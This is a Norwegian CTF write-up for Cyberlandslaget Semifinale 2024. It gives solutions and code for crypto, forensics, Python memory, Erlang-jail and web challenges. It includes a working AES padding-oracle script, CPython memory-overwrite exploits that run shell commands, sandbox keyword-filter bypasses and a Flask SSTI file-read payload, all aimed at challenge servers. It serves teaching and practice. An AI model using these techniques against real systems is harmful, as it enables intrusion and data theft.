# Cyberlandslaget Semifinale 2024

## TWICE THE FUN

### Oppgave

Oppgaven gir et flagg kryptert med en variasjon av RSA. Målet blir å finne `p` og `q`, som er faktorer vi må ha for å løse opp kryptoen, der vi er gitt `n`. 

### Løsning

Sårbarheten ligger i måten `n` er regnet ut fordi det er mulig å faktorisere det. Vi vet at `n = p*p*q`. Og at q regnes ut ifra verdien til `p`. Vi kan derfor anslå at `p` er ca. kuberoten til `n`. I python bruker jeg `gmpy2` for å regne ut kubroten siden tallet er for stort til å regne på normalt vis.

Videre regner vi ut en q for den anslåtte verdien og sjekker om det gir riktig n. Vi vet at siden q skal være større enn 2p vil p sansynligvis være mindre enn `p` vi nettopp anslo. Derfor trekker vi fra 1. på `p` og gjentar prosessen helt til vi finner riktig verdier for både `p` og `q`.

Når vi har `p` og `q` kan vi dekryptere RSA på normalt vis.

```py
from Crypto.Util.number import inverse, isPrime, long_to_bytes
import gmpy2

# Derive p and q from n
def find_p_q_from_n(n):
    p = gmpy2.iroot(n // 2, 3)[0] # Approximate p
    while True:
        q = 2*p+1
        while not isPrime(q):
            q+=2

        if(n==p*p*q): # We use formula for n to know when we hit right numbers
            return p, q
        p-=1

n = 1504669465049250683772825812578432054507293469234421835013894405310029960001983693956912395839709925438318274076100369116441789151651472045481303645596451178044586947308741326342766946348630525172225455603087171717275879906781697990672417080309828718603899890408758061554793354470946237190153046132595139051833787905084525716653409952939965245932629241867891105816295312963551089357342449126371563191942303757697572037235418723425388339389144253372697659489780008584869576092272222910562814998683399481883646227829886163589601081060863166903096435784100163915678274553319845314634193005315230701522142083632691208361739899372423774622550914730653670856567925991737570190700269083750650059188495925847590358041692543397415444779391909829587672451139072901892332418440718339037451719206793643432918776943522136979576087474253202699170303465845463979782634173216861141355335128763721879090387732568316702463122261502225660041393
p, q = find_p_q_from_n(n)

# Decrypt RSA
def rsa_decrypt(ciphertext, p, q, e):
    # Decrypt
    n = p * q # Step 1: Calculate n
    phi_n = (p - 1) * (q - 1) # Step 2: Calculate phi(n)
    d = inverse(e, phi_n) # Step 3: Calculate d
    plaintext = pow(ciphertext, d, n)# Step 4: Decrypt the ciphertext
    # Convert
    plaintext_bytes = long_to_bytes(plaintext)# Convert plaintext to bytes
    return plaintext_bytes

# Example values (replace these with actual values)
ct = 1304424190919978876516800524936732535532889212279025759778938075403767104703994460355369908632042199926149864229966072220749061756015880633984287139530817670037731556700936668736014989128856941038121333449588710935013940725082131681654786817546535502072597057812967566401390904999857172755875652077686441199446358707719166532919322359752139647281271460380115732970033292260235562514459742596317748033907941341286128923469731299426798487768259349309102647352830542470415205883224743817436632111612977604456791428544839714257697225218521957257406883183240852084583257505766030666213438250352938521045852442046803332778113751573967669159177519544254188988368501518323140661079215900643367288348959601085977045971903041287754216564261136081134377929847610332430007367178900393794281046030435979302273565405946127574246195294766619502018813897322043850150369281085460873488367977594234564181865623144922047666987103613594370175407
e = 65537

# Decrypt the ciphertext
plaintext = rsa_decrypt(ct, p, q, e)
print(f"Decrypted message: {plaintext.decode()}")
```

<details>
<summary>Flagg</summary>

`flag{hvis_n_kan_faktoreres_blir_det_problemer}`
</details>



## PADDYS PADDING VALIDATOR

### Oppgave

Oppgaven består av en AES padding validator som kan brukes til å verifisere om padding i en dekryptering.

### Løsning

Dette problemet er en velkjent CTF utfordring, **AES Padding Oracle**. Det fungerer ved at vi kan utnytte en svakhet i CBC AES-kryptering ved å kunne verifisere padding. [Denne artikkelen](https://medium.com/@masjadaan/oracle-padding-attack-a61369993c86) forklarer matematikken bak angrepet. For å slippe å skrive all kode selv kopierer jeg et prosjekt fra [ctfrecipes.com](https://www.ctfrecipes.com/cryptography/symmetric-cryptography/aes/mode-of-operation/cbc/padding-oracle/challenge-example#full-exploitation) og skriver om så jeg kan koble til med `pwntools`.

```py
from pwn import *
from rich.console import Console
import string
import json
import copy

console = Console()
context.log_level = 'error'

p = remote('paddyspaddingvalidator.ept.gg', 1337, ssl=True)
print("start")
def getToken():
    p.recvuntil(b"ct=")
    token = p.recvline().decode()
    return token

def checkToken(token):
    p.sendlineafter(b">", token.encode())
    resp = p.recvuntil("\n")
    return resp

token = bytes.fromhex(getToken())

blocks = [token[i:i+16] for i in range(0,len(token),16)]

plain = b""
with console.status(f"Trying byte : ") as a:
    for i in range(len(blocks)-1):
        arbitrary = copy.copy(blocks)
        for b in range(16):
            cur_plain = b"\x00" * (16-b) + plain[-16*(i+1):len(plain)-16*i]
            trail = xor(b+1, cur_plain, blocks[-2])[16-b:]
            
            for c in range(0,255):
                c = bytes([c])
                block_attack = (15 - b) * b'\x00' + c + trail
                arbitrary[-2] = block_attack
                test = b''.join(arbitrary).hex()

                a.update(f"clear = {plain}\nblock_attack = {block_attack}\ntoken = {test}\nTrying byte : {c}")
                r = checkToken(test)

                if b'error' not in r:
                    plain_byte = xor(c, b+1, blocks[-2][-b-1])
                    plain = plain_byte + plain
                    break

        blocks = blocks[:-1]

print(f"clear = {plain}")
p.close()
```

Programmet jobber seg gradvis gjennom og dekrypterer flagget bakfra.

<details>
  <summary>Flagg</summary>
  
  `flag{lEaKy_PadD1nG_d3cRyp7Ed_tHIs_fLaG!!}`
</details>



## THE NORRINGTON CREW 1

### Oppgave

Disse oppgavene gir oss en E01-evidencemappe som inneholder et windowsfilsystem, samt en PDF som hinter til hvordan systemet er blitt infisert.

Første oppgave er å finne navnet på malwaren, samt navnet på programmet som har blitt infisert: `flag{NAMEOFMALWARE.exe,NAMEOFPROGRAM.exe}`

### Løsning

I PDFen får vi hint om hvilket program som blir infisert: `The DLL mimics wellknown DLLs associated with media player applications on the victim’s system`. Her er det snakk om VLC MediaPlayer (`vlc.exe`)

For å finne navnet på malwaren åpnet jeg E01-filen med FTK Imager, og lette rundt etter en eller annen mistenkelig executable. Jeg endte til slutt opp i listen over prosesser i `windows/prefetch` og fant en exe-fil med et veldig mistenkelig navn :)

<details>
<summary>Flagg</summary>

`flag{GratisFilmerForFree.exe,vlc.exe}`
</details>



## THE NORRINGTON CREW 2

### Oppgave

Oppgave bygger på vedleggene vi fikk i forrige oppgaven og vi skal frem til "registry key and domain that is beaconed at startup": `flag{registrykey,domain}`

### Løsning

I `Users/%usename%` finnes en fil, `NTUSER.DAT`. Denne filen inneholder informasjon om ulike registers på systemet. Denne filen kan eksporteres ut fra E01-mappen og åpnes i Windows Registry Editor.

Registeret vi er ute etter ligger i oppstartsmappen `SOFTWARE/Microsoft/Windows/CurrentVersion/Run`. Der finner jeg et register som forsøker å pinge et domene som kan knyttes til en av organisjasjonene det står om i PDFen. Flagget er navnet på registeret og domenet den forsøker å kontaktet satt sammen.


<details>
<summary>Flagg</summary>

`flag{WindowsUpdateTelemetry,filmpolitiet-icmp-beacon.no}`
</details>



## THE NORRINGTON CREW 3

### Oppgave

Oppgave bygger på vedleggene vi fikk i forrige oppgaven og krever at du undersøker hvil.
`flag{c:\path\to\fake\dll.dll,powershellscript.ps1,newnamelegitimatedll.dll}`

### Løsning

Jeg bruker et program for å åpne prefetch filene i `/windows/prefetch`-mappen. Den inneholder interessant informasjon om hvilke utvidelser (dll) ulike programmer interagerer med. De interessante filene å se på er `GratisFilmerForFree` og `vlc.exe`.

`GratisFilmerForFree.exe` interagerer med en fil med det mistenkelige navnet `libvlc.dll`. Den samme filen finnes også i lista til `vlc.exe`. `vlc.exe` laster filen fra mappen `/windows`. Itillegg kan vi også se at denne fila har filnavnet sitt skrevet i lowercase der de opprinnelige filene er i uppercase.
`GratisFilmerForFree.exe` interagerer også med en fil kalt `teitilopmlif.ps1` (filmpolitiet baklengs) i mappen `/Windows/Temp`.

Den siste delen av utfordringen er å finne ut hvor det ble av den originale `libvlc.dll`-fila. Vi kan se at det i mappen `GratisFilmerForFree.exe` interagerer med det mistenkelig like navnet `libvlcx.dll`, uten at det er en del av en normal vlc-installasjon. Dette er originalfilen med nytt navn.

<details>
<summary>Flagg</summary>

`flag{c:\windows\libvlc.dll,teitilopmlif.ps1,libvlcx.dll}`
</details>



## THE NORRINGTON CREW 4

### Oppgave

Oppgave bygger på vedleggene vi fikk i forrige oppgaven og krever at du undersøker handlemåten til powershell-scriptet generert av malwaren.
`flag{decimalnumberofcommands,nameoffile.ext}`

### Løsning

PS1 scriptet kjører flere kommandoer og piper resultatet til en annen fil i `Temp`-mappen. Filens navn avslører at det er denne filen som inneholder dataen som blir sendt tilbake til TA.

<details>
<summary>Flagg</summary>

`flag{4,sendback.txt}`
</details>



## THE NORRINGTON CREW 5

### Løsning

Angrepsmetoden finner man lett ved å søke etter vlc på [attack.mitre.org](https://attack.mitre.org/), og jobbe ut ifra resultatene. Her er det to alternativer: [DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/) eller [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/). Ettersom malwaren ikke manipulerer hvilke DLL files som lastes må det være den siste.

SHA1 hashen er noe vanskeligere å finne ettersom vi ikke har filen som skal hashes. Derfor forsøker jeg å finne ut om filinfo kan ha blitt logget et sted. I `Windows/appcompst/Programs` finnes det Amcache.hve-logger. Disse filene kan parses til .CSV ved å bruke EricZimmermans [AmcacheParser](https://github.com/EricZimmerman/AmcacheParser?tab=readme-ov-file). Resultatet blir et par CSV-filer. I en av listene finner jeg malwarefila kjent fra tidligere:

```csv
... SHA1,IsOsComponent,FullPath,Name, ...
... ff0b253e9315b7e869f6e33cc4865bcb4287ac34,True,c:\windows\system32\em.exe,EM.exe ...
... a30e4111e183514def89d2bc31071231deabc4df,True,c:\windows\explorer.exe,explorer.exe ...
... 607a5beeb5c316fd95ba43acd641eb487fe77f2f,False,c:\users\jacques\downloads\gratisfilmerforfree.exe,GratisFilmerForFree.exe ...
...
```

<details>
<summary>Flagg</summary>

`flag{607a5beeb5c316fd95ba43acd641eb487fe77f2f,T1574.001}`
</details>



## PYMEM WARMUP

### Oppgave

Oppgaven er å hente ut flagget lagret i minnet ved hjelp av et pythonscript som lar deg lese minneadressene.

```
Welcome to a series of forensics challenges to understand memory layout of a running python process
pymem warmup: Let's get you warmed up!
id=0x7f2f75953440
read from memory address:
```

### Løsning

Min løsningen var å automatisere minneavlesningen med pwntools ved å starte med første addresse og be om å få lese hver 8. addresse. Til slutt dekoder jeg strengen til ascii-tegn.

```py
from pwn import *

# Connect to the remote service
io = remote('pymemwarmup.ept.gg', 1337, ssl=True)

io.recvuntil(b"=")
startAddr = int(bytes.decode(io.recvuntil(b"\n", drop=True)), 16)

result = b""
for i in range(50):
    # Send address
    addr = hex(startAddr + i*8)
    io.sendlineafter(b":", addr)

    # Read data and concat
    io.recvuntil(b": ")
    result += io.recvuntil(b"\n", drop=True)
    
# Decode bytestring
print(bytes.fromhex(bytes.decode(result)))

# Close the connection
io.close()
```

Resultatet fra koden over gir flagget i klartekst gjemt i minnedumpen:

```
b"\x01\x00\x00\x00\x00\x00\x00\x00\x80\xf1o#\xb1U\x00\x00J\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xffflag{xxx}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\xb7o#\xb1U\x00\x002\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xe4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00unclosed file <_io.BufferedReader name='flag.txt'>\x00\x01\x10\x03\x10\x01\x08\x02\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\xc0\xb7o#\xb1U\x00\x00:\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xe4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00All callers to this function MUST hold self._waitpid_lock.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xa0\xbbo#\xb1U\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00p\x00\xfe1\x12\x7f\x00\x00pp\xe81\x12\x7f\x00\x00\xb0\xdb\x182\x12\x7f\x00\x00"
```

<details>
  <summary>Flagg</summary>
  
  `flag{did_you_do_a_simple_memorydump?_tha7_will_not_work_on_the_next_chal!}`
</details>



## PYMEM POINTERS

### Oppgave

Oppgaven er å hente ut flagget lagret i en 2d-liste i python. Lister i python lagres som et array av pointers, derav navnet på oppgaven.

```
pymem pointers: brute-force will not work here, read pointers like CPython!
id=0x7fc61e1d0800
read from memory address:
```

### Løsning

Som vi kan se i [kildekoden](https://github.com/python/cpython/blob/5c22476c01622f11b7745ee693f8b296a9d6a761/Include/listobject.h#L22) til CPython lagres lister som et objekt med denne strukturen (forenklet):

```
   # PyListObject       # ob_item (array of pointers to other objects):
+------------------+                    +----------+
| ob_refcnt  num   |                    | 0x111111 |
+------------------+                    +----------+
| ob_type   type*  |           / - - -> | 0x222222 |
+------------------+          /         +----------+
| ob_size    num   |         /          | 0x333333 |
+------------------+        /           +----------+
| ob_item    ptr*  | - - - /
+------------------+
| allocated  num   |
+------------------+
```

Lista vi skal finne er i to dimensjoner. Vi går gjennom `ob_item` til den ytterste lista for å gå igjennom alle underlistene. Vi gjentar prosessen for underlistene, men denne gangen vet vi at det kun ligger én pointer i `ob_item`. I dette feltet finner vi en tallverdi som også står oppført i [kildekoden](https://github.com/python/cpython/blob/5c22476c01622f11b7745ee693f8b296a9d6a761/Include/longobject.h) til CPython (forenklet):

```
+-------------------+
| ob_refcnt:   num  | 
+-------------------+
| ob_type:    type* |
+-------------------+
| ob_size      num  |
+-------------------+
| ob_digit[0]  num  |
+-------------------+
```

Koden bruker pwntools for å iterere over den ytterste listen og leter gjennom hierarkiet for hver bokstav i flagget. For å lese minneadressene riktig må adressene i oppgaven konverteres fra **big-endian** til **little-endian**. Det skjer i `read_addr`-funksjonen.


```py
from pwn import *

# Read memory address
def read_addr(addr):
    io.sendlineafter(b":", addr)
    # Read data and concat
    io.recvuntil(b": ")
    value = bytes.fromhex(io.recvuntil(b"\n", drop=True).decode('utf-8'))[::-1].hex()
    return value

# Connect to the remote service
io = remote('pymempointers.ept.gg', 1337, ssl=True)

# Read flag object id
io.recvuntil(b"=")
f_list = int(bytes.decode(io.recvuntil(b"\n", drop=True)), 16)

f_ptr = read_addr( hex(    f_list   + 3*8) ) # First list of pointers

flag = ""
flag_length = read_addr( hex(f_list + 2*8) )
for i in range(int(flag_length, 16)):
    s_list    = read_addr( hex(int(f_ptr, 16)     + i*8) ) # Second list
    s_ptr     = read_addr( hex(int(s_list, 16)    + 3*8) ) # Second list of pointers
    long_elmt = read_addr( hex(int(s_ptr, 16)          ) ) # Long element
    number    = read_addr( hex(int(long_elmt, 16) + 3*8) ) # Number as hex
    flag += chr(int(number,16)) # Convert to character and append to flag

print(flag)

# Close the connection
io.close()
```

<details>
  <summary>Flagg</summary>
  
  `flag{PyTypeObject_in_CPython's_sourcecode_had_all_what_you_needed!}`
</details>



## PYPWN ONEBYTE

### Oppgave

Oppgaven er å endre en byte i stacken til et pythonprogram for å flippe en ifstatement så den blir sann. Formatet på terminalen er likt som før:

```
pypwn onebyte: you are allowed to write just one byte, can we reach the unreachable code?
id=0x7fe98ba43370
read from memory address:
```

### Løsning

Vi bruker det vi lærte fra tidligere oppgaver, men denne gangen er det `PyFunctionObject` vi er interessert i. Denne peker til et eget element `PyCodeObject`. Den inneholder informasjon som konstanter, variabler og strings i funksjonen. Elementet vi er interessert i er `instruction opcodes` også kalt `co_code`.

co_code gir oss en liste over nøyaktig hva pythonfunksjonen foretar seg. Her er et utsnitt fra noen av addressene:
```
0x00007fe98bb05430: 64017d007c006402
0x00007fe98bb05438: 6b02721774006403
0x00007fe98bb05440: 8301010074007401
0x00007fe98bb05448: 640464058302a002
```

instruksjonene leses i en og en byte og kodene betyr forskjellige ting. Noen av de jeg trengte å forså for å løse denne oppgaven var:

1. `64` : LOAD_CONST
1. `7D` : STORE_FAST
1. `83` : COMPARE_OP

Spør vi ChatGPT om å ta en titt kan den bryte opp alle instruksjonene i en lettfatta liste:

```
64017d007c006402
6b02721774006403
8301010074007401

LOAD_CONST 1: Load constant False onto the stack.
STORE_FAST 0: Store the value (False) in local variable x.
LOAD_FAST 0: Load the value of local variable x onto the stack.
LOAD_CONST 2: Load constant True onto the stack.
COMPARE_OP 2: Compare the top two elements on the stack for equality (==).
...
```

Nå som jeg forstår hva koden gjør ønsker jeg å gjøre slik at True kan lases for sammenlikning stedenfor False. Det gjør jeg ved å bytte ut **64 01** (`LOAD_CONST FALSE*`) med **64 02** (`LOAD_CONST TRUE*`)

Koden i under dumper alt du trenger å analysere i terminalen, så trenger du bare å analysere og bytte ut riktig byte manuelt.

NB: Hvis oppgaven skal debugges lokalt er det viktig å bruke linux ettersom addressene på windows ser noe annerledes ut (mner tungvint etter min erfaring)

```py
from pwn import *

# Read memory address
def read_addr(addr):
    io.sendlineafter(b":", addr)
    # Read data and concat
    io.recvuntil(b": ")
    value = bytes.fromhex(io.recvuntil(b"\n", drop=True).decode('utf-8'))[::-1].hex()
    return value

# Connect to the remote service
io = remote('pypwnonebyte.ept.gg', 1337, ssl=True)

# Read flag object id
io.recvuntil(b"=")
PyFunctionObject = bytes.decode(io.recvuntil(b"\n", drop=True))
print("PyFunctionObject:", PyFunctionObject)

PyCodeObject = read_addr( hex(int(PyFunctionObject, 16) + 6*8) )
print("PyCodeObject:", PyCodeObject)
    
co_code = read_addr( hex(int(PyCodeObject, 16) + 6*8) )
print("co_code :", co_code)

for i in range(4, 8):
    print(read_addr( hex(int(co_code, 16) + i*8) ))

io.interactive() # Use interactive mode to do the final step of analyzing and changing the right bit.

# Close the connection
io.close()
```

<details>
  <summary>Flagg</summary>
  
  `flag{aLl_w3_neEDed_wAs_a_co_code_fl1p!}`
</details>



## PYPWN EXEC

### Oppgave

Denne oppgaven dreier seg om å endre handlemåte og argumentet gitt i `shell` før programmet kjører funksjonen nederst i programmet. Av de tre funksjonene nedenfor får vi kun oppgitt adressen til `shell`-funksjonen:

```py
def exec(arg):
    os.system(arg)

def debug(arg):
    print(arg)

def shell():
    debug("id")
```

### Løsning

Vi trenger å endre to ting. Hvilken funksjon som kjøres må endres fra debug til exec. Og stringen "id" må endres til en kommando som kan skrive ut flagget fra filen flag.txt.

Å bytte ut stringen er ikke så vanskelig. I minnet finner vi et PyUnicodeObjekt der vi kan bytte ut teksten "id" med vår egen tekst:

```
0x00007fe49ba98a70: 0000000000000014 # HEAD
0x00007fe49ba98a78: 00005648392167c0 # Type
0x00007fe49ba98a80: 0000000000000002 # Lengde på string <- 08
0x00007fe49ba98a88: d5f125e0c0265022 # Hash
0x00007fe49ba98a90: 00000000000000e5 #
0x00007fe49ba98a98: 0000000000000000 # NULL
0x00007fe49ba98aa0: 0000000000006469 # String <- 2a63617420747874 (cat *txt)
```

Å bytte ut funksjonen er litt mer komplisert. Vi utnytter at funksjonene ligger ved siden av hverandre i minnet med konstant avstand, 0x90. Det gjør at vi kan både lese og skrive over innholdet i både exec og debug. Hvis vi nå erstatter instruksjonene til debug med intsruksjoner fra exec vil debug nå oppføre seg som exec.

Ettersom intrsuksjonene peker til stringen med en absolutt pointer vil instruksjonene fortsatt lese den gamle stringen (som nå er endret).


```py
from pwn import *

# Read memory address
def read_addr(addr):
    io.sendlineafter(b":", addr)
    # Read data and concat
    io.recvuntil(b": ")
    value = bytes.fromhex(io.recvuntil(b"\n", drop=True).decode('utf-8'))[::-1].hex()
    return value

# Read memory address
def write_addr(addr, value):
    io.sendlineafter(b":", addr)
    io.sendlineafter(b":", value)
    # Clean up response
    io.recvuntil(b"\n", drop=True).decode('utf-8')

# Connect to the remote service
io = remote('pypwnexec.ept.gg', 1337, ssl=True)
# io = process(["python3","./source.py"]) # local debugging

# Shell
print(io.recvuntil(b"="))
ShellFunctionObject = bytes.decode(io.recvuntil(b"\n", drop=True))
ShellCodeObject = read_addr(hex(int(ShellFunctionObject, 16) + 6*8))
Shell_co_consts = read_addr(hex(int(ShellCodeObject, 16) + 7*8))
arg_str = read_addr( hex(int(Shell_co_consts, 16) + 4*8) )
print(f"The constants list where \"id\" will be replaced starts at: {arg_str}")

# Debug
DebugFunctionObject = hex(int(ShellFunctionObject, 16) - 144) # Debug is -0x90 relative to Shell

# Exec
ExecFunctionObject = hex(int(ShellFunctionObject, 16) - 288)  # Exec is -0x120 relative to Shell
ExecCodeObject = read_addr( hex(int(ExecFunctionObject, 16) + 6*8))
print(f"code object of exec: {ExecCodeObject} will be replaced with code object in debug at address {hex(int(DebugFunctionObject, 16) + 6*8)}")

# Exit read mode
io.sendlineafter(b":", "write")

# Change string "id" -> "cat *txt"
write_addr(hex(int(arg_str, 16) + 2*8), "08") # update length of str
for i in range(0, 16, 2):
    write_addr(hex(int(arg_str, 16) + 6*8 + i//2), bytes.fromhex("7478742a20746163")[::-1].hex()[i:i+2])

# Change co_code debug -> exec
for i in range(0, 16, 2):
    write_addr(hex(int(DebugFunctionObject, 16) + 6*8 + i//2), bytes.fromhex(ExecCodeObject)[::-1].hex()[i:i+2])

# Exit read mode
io.sendlineafter(b":", "write")

io.interactive() # Use interactive mode to do the final step of analyzing and changing the right bit.

# Close the connection
io.close()
```

<details>
  <summary>Flagg</summary>
  
  `flag{d1D_YOu_in-meMoRY_oVerWriTe_0f_globals_debug?}`
</details>



## POKEGLYPHS

### Oppgave

Vi ble gitt en fil, glyphs.txt, med emojier og navn på Pokemons. Vi får også et hint til hva dette kan bety i oppgaveteksten: "Some are big and strong, while others are small and fast."

```
🔮 Vespiquen 🗡️ Carracosta 🛡️ Sandy Shocks 🪄 Bellibolt 🏃 Meowscarada 🪄 Appletun 🪄 Manectric 🛡️ Arctovish 🏃 Minun 🗡️ Tyrantrum 🪄 Salazzle 🗡️ Avalugg 🗡️ Poliwrath 🛡️ Solgaleo 🩸 Reuniclus 🏃 Scream Tail 🛡️ Tyrantrum 🪄 Chimecho 🏃 Heliolisk 🪄 Salazzle 🔮 Tapu Lele 🔮 Primarina 🗡️ Gliscor 🛡️ Durant 🩸 Gastrodon 🛡️ Solgaleo 🔮 Stakataka 🏃 Walking Wake 🏃 Scream Tail 🪄 Latias 🛡️ Seadra 🗡️ Hippowdon 🏃 Swoobat 🪄 Empoleon 🔮 Vespiquen 🗡️ Houndstone 🛡️ Suicune 🩸 Baxcalibur 🩸 Brute Bonnet 🩸 Amoonguss 🪄 Cacturne 🔮 Vaporeon 🏃 Raticate 🏃 Swoobat 🩸 Aromatisse 🔮 Tapu Bulu 🩸 Emboar 🏃 Raticate 🏃 Heliolisk 🩸 Aromatisse 🩸 Dunsparce 🩸 Miltank 🪄 Noivern 🛡️ Vespiquen 🗡️ Cinderace 🗡️ Houndstone 🛡️ Iron Bundle 🔮 Silvally 🔮 Bronzong 🔮 Polteageist 🛡️ Obstagoon 🩸 Aromatisse 🏃 Persian 🏃 Crabrawler 🪄 Gardevoir
```

### Løsning

Løsningen på denne oppgaven er å løse emoji og pokemon i par. Emojien symboliserer en stat for pokemonen. Eksempelvis 🗡️ for attack-stat og 🛡️ for defence-stat. Tallene for hver egenskap tilsvarer asciibokstaver.

Jeg bruker [pokeapi](https://pokeapi.co/) for å finne egenskapene for alle pokemonene. Noen av pokemonene er ikke oppført i apien på vanlig måte, derfor krever noen at jeg gjør et ekstra søk for å hente et gyldig navn på den pokemonen som kan brukes i APIet. Her er løsningen i python:

```py
import requests

def fetch_pokemon_data(pokemon_name):
    url = f"https://pokeapi.co/api/v2/pokemon/{pokemon_name}"
    response = requests.get(url)

    if response.status_code == 200:
        # If the request is successful, return the JSON data
        return response.json()
    else:
        # If pokemon does not exist search as spicies instead
        url = f"https://pokeapi.co/api/v2/pokemon-species/{pokemon_name}"
        response = requests.get(url)
        if response.status_code == 200:
            # If the request is successful try getting the default pokemon for found species
            return fetch_pokemon_data(response.json()[varieties][0]["name"])


# List of emojies (ordered as they appear in the api)
emojis = ["🩸", "🗡️", "🛡️", "🪄", "🔮", "🏃"]

# Open data
with open("glyphs.txt", 'r', encoding='utf-8') as file:
    text = file.readline()

# Split at each emoji
for e in emojis:    
    text = text.replace(e, f"!{e}?")
text = text.split('!') # Lag et array med alle emojier og pokemons.
        
string = ""
for i in range(1, len(text)):
    emoji = text[i].split("?")[0]
    pokemon = text[i].split("?")[1].strip().lower().replace(" ", "-")
    
    data = fetch_pokemon_data(pokemon)

    # Check each emoji
    for n, e in enumerate(emojis):
        if(emoji == e):
            string+=chr(data["stats"][n]["base_stat"])
            break

print(string) # Print result
```

Programmet printer ut en lang tekst der flagget ligger i klartekst.

<details>
  <summary>Flagg</summary>
  
  `flag{did_you_know_most_pokemon_professors_are_named_after_trees?}`
</details>



## EJAIL 1

### Oppgave

Oppgaven gir deg et shell hvor du kan skrive erlang-kommandoer, med noen begrensninger. Kildekoden forteller oss at det er noen blokkerte keywords: ["flag.txt", "/bin", "os:cmd", "rpc:", "spawn", "open_port("]

### Løsning

Det første jeg tenkte var å prøve å finne en mulighet for å kjøre shellkommandoer gjennom scriptet, men den åpenbare os:cmd er blokkert. Derfor ble det å løse oppgaven i Erlang:

```erl
{ok, Files} = file:list_dir("."). % Lister alle filer
{ok, Content} = file:read_file("Dockerfile"). % Forsøker åpne fil (fungerer på ikke-blokkerte keywords)
{ok, Content} = file:read_file("flag"++".txt"). % Omgår blokkering
```

Siste kommando printer flagget slik: {ok,<<"flag{xxx_xxx_xxx}">>}

<details>
<summary>Flagg</summary>

`flag{80s_T3l3c0M_50f7w4R3_G0n3_W1lD}`
</details>



## EJAIL 2

### Oppgave

Oppgaven gir deg et erlang-shell med mange begrensninger. Alle funksjoner som intuitivt kan brukes for å lese en fil er begrenset, så vi må finne en vei å omgå restriksjonene. Oppgaven gir oss et hint: `"loading beams"`

### Løsning

Hensikten med denne oppgaven er å gjøre kommandoen for å printe flagget i en ekstern fil. Jeg lager en der koden som en modul, kalt `module`. Erlangkoden ser slik ut:

```erl
-module(module).
-export([init/0]).

init() -> file:read_file("flag.txt").
```

Filen som kan kjøres skal være en BEAM-fil. For å lage modulen skriver vi først koden til en `.erl`-fil, før den kompileres til en `beam`-fil:

```erl
file:write_file("module.erl", "-module(module).\n-export([init/0]).\ninit() -> file:read_file(\"flag.txt\").").

compile:file("module.erl").
```

Til slutt kan vi kjøre funksjonen vi lagde i modulen. Den printer ut flagget slik: {ok,<<"flag{xxx_xxx_xxx}">>}
```erl
module:init().
```

<details>
<summary>Flagg</summary>

`flag{M0r3_5733l_B34Ms_c4nn0t_h0Ld_m3_B4cK}`
</details>



## EPRISON

### Oppgave

Her får vi bare oppgitt en `beam`-fil (trolig med begrensninger) og får en dytt i retningen av at vi ønsker å se kildekoden for å løse oppgaven.

### Løsning

Jeg forsøker først å se om `file:list_dir(".").` fungerer (noe det gjør), før jeg skjønner at vi er i et erlangshell som sist. Derfor forsøker jeg å gjenbruke koden fra forrige oppgave. Det viste seg å fungere, og jeg fikk flagget.

<details>
<summary>Flagg</summary>

`flag{I_h4v3_35c4p3D_3rL74n4M0_B4y_3zPz}`
</details>



## INTRO-UAF

### Oppgave

```
##########  ##########  ##########  ##########  ##########
#00000000#  #00000000#  #00000000#  #00000000#  #00000000#
#00000000#  #00000000#  #00000000#  #00000000#  #00000000#
#00000000#  #00000000#  #00000000#  #00000000#  #00000000#
#00000000#  #00000000#  #00000000#  #00000000#  #00000000#
##########  ##########  ##########  ##########  ##########

1. New command
2. Execute command
3. New thing on heap
4. Edit thing on heap
5. Delete thing on heap
6. Show my things
7. Exit
```

### Løsning

Trikset for å løse denne oppgaven er å starte med å lagre data i en blokk kun for å slette det igjen. Det gjør at vi kan redigere det senere. Når jeg nå oppretter en ny kommando fyller den den samme blokken. Siden det er den samme blokken som er allokert i minnet kan jeg oppdatere innholdet i blokken. Kjører jeg den nye, oppdaterte kommandoen får jeg flagget i klartekst.

1. Lagre tekst: `3` -> `0` -> `foo`
1. Slett tekst: `5` -> `0`
1. Ny kommando: `1` -> `1`
1. Oppdater blokk: `4` -> `0` -> `cat flag.txt`
1. Kjør kommando: `2`

<details>
  <summary>Flagg</summary>
  
  `flag{c1522fa2b3c1599b03b1391de70f68dc}`
</details>



## GREETING

### Oppgave

Vi ble gitt en nettside som kjører Flask i python, samt kildekoden til siden. I kildemappen ligger det en `flag.txt`-fil, men det er ingen kode i `app.py`-scriptet som henter fila. Derfor må vi forsøke å angripe nettsiden med egen kode for å hente fila.

### Løsning

Vi kan utnytte at scriptet rendrer teksten vi skriver inn på en uforsiktig måte:

```py
content.format(name=name, text=text, ...)
```

Denne funksjonen er sårbar for Flask injection som lar oss kjøre egen pythonkode (med noen restriksjoner). Koden henter ut flagget fra filen `flag.txt`, men klipper ut første bokstav for å omgå filteret i python-scriptet:

```py
{{ get_flashed_messages.__globals__.__builtins__.open("flag.txt").read()[3:] }}
```

Koden kan plasseres i en av feltene name eller message, og vil gi flagget uten `flag`-prefiksen, så denne setter vi på selv etterpå.

<details>
  <summary>Flagg</summary>
  
  `flag{SSTI_or_Super_Snuggly_Tabby_Infatuation}`
</details>